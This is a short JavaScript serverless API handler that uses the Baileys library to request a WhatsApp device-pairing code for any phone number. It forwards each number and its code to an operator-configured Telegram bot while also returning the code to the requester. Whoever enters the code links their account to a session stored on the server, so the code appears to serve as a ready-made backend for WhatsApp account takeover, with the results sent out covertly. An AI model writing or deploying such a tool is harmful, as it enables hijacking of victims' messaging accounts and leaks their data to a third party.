const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require("@whiskeysockets/baileys");
const axios = require("axios");
const pino = require("pino");

export default async function handler(req, res) {
    const { number } = req.query;
    if (!number) return res.status(400).json({ error: "Number required" });

    // SET YOUR TELEGRAM INFO HERE
    const TG_TOKEN = "YOUR_BOT_TOKEN"; 
    const TG_CHAT_ID = "YOUR_CHAT_ID";

    try {
        // 1. Alert Telegram
        await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            chat_id: TG_CHAT_ID,
            text: `🔔 *New Request*\nNumber: ${number}`,
            parse_mode: "Markdown"
        });

        // 2. WhatsApp Handshake
        const { version } = await fetchLatestBaileysVersion();
        const { state } = await useMultiFileAuthState('/tmp/session-' + number);

        const sock = makeWASocket({
            version,
            auth: state,
            logger: pino({ level: "silent" }),
            browser: ["Chrome (Linux)", "", ""]
        });

        // 3. Request Pairing Code
        await new Promise(r => setTimeout(r, 3000));
        const code = await sock.requestPairingCode(number.replace(/[^0-9]/g, ''));

        // 4. Send Code to Telegram
        await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            chat_id: TG_CHAT_ID,
            text: `✅ *Code for ${number}:* \`${code}\``,
            parse_mode: "Markdown"
        });

        return res.status(200).json({ code });
    } catch (e) {
        return res.status(500).json({ error: "Try again in 10 seconds" });
    }
}
